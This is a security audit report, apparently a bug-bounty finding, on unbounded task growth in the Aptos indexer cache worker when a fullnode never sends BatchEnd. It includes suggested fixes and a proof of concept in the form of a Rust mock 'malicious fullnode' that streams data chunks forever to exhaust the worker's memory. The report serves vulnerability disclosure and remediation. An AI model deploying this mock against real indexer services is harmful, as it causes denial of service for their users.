# Audit Report

## Title
Unbounded Task Accumulation in Cache Worker Due to Missing BatchEnd Signal Validation

## Summary
The `process_streaming_response()` function in the indexer cache worker accumulates spawned tasks without any upper bound or timeout when processing transaction data chunks from a fullnode. If a malicious, compromised, or buggy fullnode continuously sends `ChunkDataOk` messages without ever sending the required `BatchEnd` signal, the cache worker will spawn tasks indefinitely, leading to unbounded memory growth and eventual out-of-memory (OOM) crash. [1](#0-0) 

## Finding Description
The cache worker's streaming response processor operates as follows:

1. It initializes an empty task vector [1](#0-0) 

2. In the main processing loop, for each `ChunkDataOk` message received, it spawns an asynchronous task to update the Redis cache and pushes this task handle into the vector [2](#0-1) 

3. Tasks are only joined and the vector is cleared when a `BatchEnd` signal arrives [3](#0-2) 

The protocol design expects the fullnode to send: `Init → ChunkDataOk* → BatchEnd → ChunkDataOk* → BatchEnd → ...` where each batch is bounded and followed by a `BatchEnd` signal [4](#0-3) 

**The Vulnerability:**
The cache worker has **no safeguards** against a fullnode that:
- Never sends `BatchEnd` signals
- Sends an unbounded number of `ChunkDataOk` messages
- Has a bug preventing `BatchEnd` delivery

There is no:
- Maximum limit on the `tasks_to_run` vector size
- Timeout on batch completion
- Validation that `BatchEnd` arrives within a reasonable timeframe
- Circuit breaker for excessive task accumulation

**Attack Scenario:**
1. Attacker compromises the configured fullnode OR exploits a fullnode bug
2. Malicious fullnode sends `Init` signal normally to establish the stream
3. Fullnode continuously sends `ChunkDataOk` messages with valid transaction data
4. Fullnode never sends `BatchEnd` signal
5. Cache worker spawns one task per chunk and accumulates them in `tasks_to_run`
6. Each task holds transaction data and associated state in memory
7. Memory usage grows linearly: `memory_usage ≈ num_chunks × avg_chunk_size`
8. Cache worker eventually exhausts available memory
9. Process crashes with OOM or becomes unresponsive
10. Indexer service disruption affects all dependent applications

The fullnode address is operator-configured [5](#0-4) , meaning the attack requires either infrastructure compromise or configuration error, but provides no defense-in-depth protection.

## Impact Explanation
This vulnerability constitutes a **High Severity** issue under the Aptos bug bounty program criteria for "API crashes" and service disruption.

**Direct Impact:**
- Cache worker process crashes due to OOM
- Indexer API becomes unavailable or degraded
- Applications depending on the indexer lose access to recent transaction data
- Service recovery requires manual intervention and process restart

**Severity Justification:**
While this requires a compromised or buggy fullnode (limiting likelihood), the impact is severe:
- Complete service disruption for the indexer infrastructure
- No automatic recovery mechanism
- Affects all downstream consumers of the indexer API
- Memory exhaustion can affect co-located services

The comment at line 502-504 mentions "the upstream server disconnects clients after 5 minutes" [6](#0-5) , but this is not enforced as a timeout in the processing logic and a malicious server could maintain the connection indefinitely while sending chunks.

## Likelihood Explanation
**Likelihood: Medium**

**Attack Requirements:**
1. Compromise of the configured fullnode infrastructure, OR
2. Operator misconfiguration pointing to attacker-controlled endpoint, OR  
3. Bug in fullnode code preventing `BatchEnd` signal delivery

**Factors Increasing Likelihood:**
- No input validation on batch boundaries
- No defensive timeouts or limits
- Trust placed entirely on fullnode behavior
- Fullnode infrastructure is a high-value target for attackers
- Complex distributed system increases probability of edge-case bugs

**Factors Decreasing Likelihood:**
- Fullnode is typically operator-controlled infrastructure
- Configuration is not user-facing
- Requires specific compromise or bug scenario

## Recommendation
Implement multiple layers of defense-in-depth protection:

**1. Add Maximum Task Limit:**
```rust
const MAX_PENDING_TASKS: usize = 10_000; // Configurable based on expected batch size

// In the ChunkDataOk case:
if tasks_to_run.len() >= MAX_PENDING_TASKS {
    error!(
        "[Indexer Cache] Maximum pending tasks exceeded without BatchEnd signal"
    );
    ERROR_COUNT.with_label_values(&["max_tasks_exceeded"]).inc();
    bail!("Batch task limit exceeded - possible malicious fullnode");
}
tasks_to_run.push(task);
```

**2. Add Batch Timeout:**
```rust
// Before the main loop:
let batch_start_time = std::time::Instant::now();
const MAX_BATCH_DURATION: Duration = Duration::from_secs(300); // 5 minutes

// In the loop, after receiving each message:
if batch_start_time.elapsed() > MAX_BATCH_DURATION && !tasks_to_run.is_empty() {
    error!(
        pending_tasks = tasks_to_run.len(),
        "[Indexer Cache] Batch timeout exceeded without BatchEnd signal"
    );
    ERROR_COUNT.with_label_values(&["batch_timeout"]).inc();
    bail!("Batch processing timeout - BatchEnd signal not received");
}

// Reset timer when BatchEnd is received:
batch_start_time = std::time::Instant::now();
```

**3. Add Memory Monitoring:**
```rust
use sysinfo::{System, SystemExt};

// Periodically check memory usage
if tasks_to_run.len() % 1000 == 0 {
    let mut system = System::new_all();
    system.refresh_memory();
    let memory_usage_percent = system.used_memory() * 100 / system.total_memory();
    
    if memory_usage_percent > 90 {
        error!(
            memory_usage = memory_usage_percent,
            pending_tasks = tasks_to_run.len(),
            "[Indexer Cache] Critical memory usage detected"
        );
        bail!("Memory usage critical - terminating to prevent OOM");
    }
}
```

**4. Add Metrics and Alerting:**
```rust
// Track pending task count
PENDING_TASKS_GAUGE.set(tasks_to_run.len() as i64);

// Alert on anomalous batch sizes
if tasks_to_run.len() > EXPECTED_MAX_BATCH_SIZE {
    warn!(
        pending_tasks = tasks_to_run.len(),
        "[Indexer Cache] Unusually large batch detected"
    );
}
```

## Proof of Concept

**Malicious Fullnode Mock (Rust):**
```rust
use tonic::{transport::Server, Request, Response, Status};
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    stream_status::StatusType,
    GetTransactionsFromNodeRequest,
    TransactionsFromNodeResponse,
    StreamStatus,
    TransactionsOutput,
    transactions_from_node_response,
};
use tokio::sync::mpsc;
use tokio_stream::wrappers::ReceiverStream;

pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        ReceiverStream<Result<TransactionsFromNodeResponse, Status>>;

    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = mpsc::channel(100);
        let starting_version = req.into_inner().starting_version.unwrap_or(0);

        tokio::spawn(async move {
            // Send Init signal normally
            let init = TransactionsFromNodeResponse {
                response: Some(transactions_from_node_response::Response::Status(
                    StreamStatus {
                        r#type: StatusType::Init as i32,
                        start_version: starting_version,
                        end_version: None,
                    },
                )),
                chain_id: 1,
            };
            tx.send(Ok(init)).await.unwrap();

            // Send infinite ChunkDataOk messages WITHOUT BatchEnd
            let mut version = starting_version;
            loop {
                let chunk = TransactionsFromNodeResponse {
                    response: Some(transactions_from_node_response::Response::Data(
                        TransactionsOutput {
                            transactions: vec![create_dummy_transaction(version)],
                        },
                    )),
                    chain_id: 1,
                };
                
                if tx.send(Ok(chunk)).await.is_err() {
                    break; // Client disconnected
                }
                
                version += 1;
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        });

        Ok(Response::new(ReceiverStream::new(rx)))
    }
}

// Run cache worker pointed at this malicious fullnode
// Observe memory growth and eventual OOM crash
// Expected: tasks_to_run vector grows unboundedly
// Expected: Memory usage increases linearly with time
// Expected: No BatchEnd signal prevents task cleanup
```

**Monitoring Script:**
```bash
# Monitor cache worker memory while connected to malicious fullnode
watch -n 1 'ps aux | grep cache-worker | grep -v grep | awk "{print \$6/1024\" MB\"}"'

# Expected output showing continuous growth:
# 100 MB
# 250 MB  
# 500 MB
# 1000 MB
# ... eventual OOM kill
```

## Notes
This vulnerability represents a defense-in-depth failure where the cache worker places complete trust in the fullnode's protocol compliance. While the fullnode is typically operator-controlled infrastructure, security best practices dictate that components should protect themselves against misbehaving upstream services, whether due to compromise, bugs, or configuration errors.

The absence of basic safeguards (timeouts, limits, resource monitoring) makes this component vulnerable to resource exhaustion attacks that could disrupt the entire indexer service infrastructure, affecting all applications that depend on it for transaction data access.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L354-354)
```rust
    let mut tasks_to_run = vec![];
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L395-404)
```rust
                GrpcDataStatus::ChunkDataOk {
                    num_of_transactions,
                    task,
                } => {
                    current_version += num_of_transactions;
                    transaction_count += num_of_transactions;
                    tps_calculator.tick_now(num_of_transactions);

                    tasks_to_run.push(task);
                },
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L413-432)
```rust
                GrpcDataStatus::BatchEnd {
                    start_version,
                    num_of_transactions,
                } => {
                    // Handle the data multithreading.
                    let result = join_all(tasks_to_run).await;
                    if result
                        .iter()
                        .any(|r| r.is_err() || r.as_ref().unwrap().is_err())
                    {
                        error!(
                            start_version = start_version,
                            num_of_transactions = num_of_transactions,
                            "[Indexer Cache] Process transactions from fullnode failed."
                        );
                        ERROR_COUNT.with_label_values(&["response_error"]).inc();
                        panic!("Error happens when processing transactions from fullnode.");
                    }
                    // Cleanup.
                    tasks_to_run = vec![];
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L502-504)
```rust
    // It is expected that we get to this point, the upstream server disconnects
    // clients after 5 minutes.
    Ok(())
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L135-199)
```rust
            while coordinator.current_version < coordinator.end_version {
                let start_time = std::time::Instant::now();
                // Processes and sends batch of transactions to client
                let results = coordinator.process_next_batch().await;
                if abort_handle.load(Ordering::SeqCst) {
                    info!("FullnodeDataService is aborted.");
                    break;
                }
                if results.is_empty() {
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        "[Indexer Fullnode] Client disconnected."
                    );
                    break;
                }
                let max_version = match IndexerStreamCoordinator::get_max_batch_version(results) {
                    Ok(max_version) => max_version,
                    Err(e) => {
                        error!("[Indexer Fullnode] Error sending to stream: {}", e);
                        break;
                    },
                };
                let highest_known_version = coordinator.highest_known_version;

                // send end batch message (each batch) upon success of the entire batch
                // client can use the start and end version to ensure that there are no gaps
                // end loop if this message fails to send because otherwise the client can't validate
                let batch_end_status = get_status(
                    StatusType::BatchEnd,
                    coordinator.current_version,
                    Some(max_version),
                    ledger_chain_id,
                );
                let channel_size = transaction_channel_size - tx.capacity();
                CHANNEL_SIZE
                    .with_label_values(&["2"])
                    .set(channel_size as i64);
                match tx.send(Result::<_, Status>::Ok(batch_end_status)).await {
                    Ok(_) => {
                        // tps logging
                        let new_base: u64 = ma.sum() / (DEFAULT_EMIT_SIZE as u64);
                        ma.tick_now(max_version - coordinator.current_version + 1);
                        if base != new_base {
                            base = new_base;

                            log_grpc_step_fullnode(
                                IndexerGrpcStep::FullnodeProcessedBatch,
                                Some(coordinator.current_version as i64),
                                Some(max_version as i64),
                                None,
                                Some(highest_known_version as i64),
                                Some(ma.avg() * 1000.0),
                                Some(start_time.elapsed().as_secs_f64()),
                                Some((max_version - coordinator.current_version + 1) as i64),
                            );
                        }
                    },
                    Err(_) => {
                        aptos_logger::warn!("[Indexer Fullnode] Unable to send end batch status");
                        break;
                    },
                }
                coordinator.current_version = max_version + 1;
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/lib.rs (L17-17)
```rust
    pub fullnode_grpc_address: Url,
```
